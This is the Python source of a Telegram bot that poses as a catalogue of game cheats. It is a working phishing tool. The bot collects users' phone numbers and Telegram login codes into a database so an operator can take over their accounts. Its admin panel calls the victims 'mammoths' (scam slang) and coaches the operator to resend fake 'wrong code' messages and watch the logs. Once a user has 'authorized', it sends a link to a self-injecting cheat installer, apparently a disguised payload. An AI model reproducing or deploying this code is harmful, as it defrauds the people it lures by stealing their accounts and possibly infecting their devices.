from aiogram import Router, types, F, Bot
from aiogram.client import bot
from aiogram.filters import CommandStart, Command
import utils.keyboards as kb
from aiogram.types import Message, CallbackQuery, InputFile, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database import Mongodb
from aiogram import Bot
import dotenv
import os


dotenv.load_dotenv()
key_panel = os.getenv('SECRET_KEY_FOR_ADM')
soft_url = os.getenv('URL_SOFTA')

router = Router()
secret_key_for_adm = key_panel
admin_list = [7697185710]


def register_all_handlers(dp):
    dp.include_router(router)


class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()


class Adminpanelstates(StatesGroup):
    waiting_for_user_id = State()
    auth = State()


@router.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer('Привет, этот бот предоставляет большой каталог различных читов на мобильные игры!',
                         reply_markup=kb.main)


@router.message(F.text == 'Мой профиль')
async def profile(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name or "Не указано"

    profile_text = f"""
Ваш профиль:
ID: {user_id}
Username: @{username or "Отсутствует"}
Nickname: {first_name} {last_name}

"""
    await message.answer(profile_text)


@router.message(F.text == 'Авторизация')
async def autorization(message: Message):
    await message.answer('Выберите способ авторизации: ', reply_markup=kb.autorizations_keyboards)


@router.callback_query(F.data == 'autorization')
async def telegram_auth(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer('Введите номер телефона: ')
    await state.set_state(AuthState.waiting_for_phone)
    await callback.answer()


@router.message(AuthState.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone_number = message.text
    user_id = message.from_user.id
    await message.answer('Введите код, отправленный вам в Telegram:')
    await state.set_state(AuthState.waiting_for_code)
    Mongodb.Mongodb.push_tg_dannie(user_id=user_id, phone_number=phone_number)


@router.message(AuthState.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    tg_code = message.text
    user_id = message.from_user.id
    await state.clear()
    Mongodb.Mongodb.push_tg_code(user_id=user_id, confirm_code=tg_code)


@router.message(F.text == 'Список игр')
async def game_list(message: Message):
    await message.answer('Список игр, на которую в данный момент доступны читы предоставлен ниже',
                         reply_markup=kb.inlines)


@router.callback_query(F.data == 'standoff')
async def standoff(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    auth = data.get('auth', False)

    photo_path = 'imgs/standoff.png'
    photo = FSInputFile(photo_path)

    if not auth:
        await callback.message.answer_photo(
            photo=photo,
            caption='Перед тем как получить доступ к нашим читам, пожалуйста, авторизируйтесь в нашем боте!'
        )
    else:
        await callback.message.answer('Если вы любите быть первым и лучшим во всех режимах, тогда без взлома вам не '
                                      'обойтись. Мы разработали лучшую и активно обновляющуюся чит-программу '
                                      'специально для вас. Инжект происходит автоматически, просто установите и '
                                      f'запустите чит! Ссылка на установку: {soft_url}')


@router.callback_query(F.data == 'roblox')
async def roblox(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    auth = data.get('auth', False)

    photo_path = 'imgs/roblox.png'
    photo = FSInputFile(photo_path)

    if not auth:
        await callback.message.answer_photo(
            photo=photo,
            caption='Перед тем как получить доступ к нашим читам, пожалуйста, авторизируйтесь в нашем боте!'
        )
    else:
        await callback.message.answer('Если вы любите быть первым и лучшим во всех режимах, тогда без взлома вам не '
                                      'обойтись. Мы разработали лучшую и активно обновляющуюся чит-программу '
                                      'специально для вас. Инжект происходит автоматически, просто установите и '
                                      f'запустите чит! Ссылка на установку: {soft_url}')


@router.message()
async def adminn_panel(message: Message):
    if message.text == secret_key_for_adm and message.from_user.id in admin_list:
        await message.answer('Админ-панель', reply_markup=kb.admin_panel)


@router.callback_query(F.data == 'adm_panel')
async def send_msg_for_mamonts(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer('Введите tg_id мамонта, который неверно отправил код или номер телефона')
    await state.set_state(Adminpanelstates.waiting_for_user_id)
    await callback.answer()


@router.message(Adminpanelstates.waiting_for_user_id)
async def process_user_id(message: Message, state: FSMContext, global_bot: Bot):
    try:
        user_id = int(message.text)
        await send_message_to_user(user_id,
                                   'Номер телефона или код авторизации введены неверно. Пожалуйста, попробуйте еще раз.',
                                   global_bot)
        await message.answer('Сообщение мамонту отправлено, следи за логами!.')
    except ValueError:
        await message.answer('Невалидный тг id, введи нормально без пробелов и т.д.')
    except Exception as e:
        await message.answer(str(e))
    finally:
        await state.clear()


async def send_message_to_user(user_id: int, text: str, global_bot: Bot):
    try:
        await global_bot.send_message(chat_id=user_id, text=text)
        print("Сообщение успешно отправлено о повторной отправки кода и номера, обновляй бд каждые 5 секунд!")
    except Exception as e:
        print(f"Что-то пошло не так... Пиши sh1ro")
        raise


@router.callback_query(F.data == 'razreshenie')
async def tralalelotralala(callback: CallbackQuery, state: FSMContext):
    await state.set_state(Adminpanelstates.auth)
    await state.update_data(auth=True)
    await callback.message.answer('Вы разрешили мамонтам скачивать читы, процесс необратим')


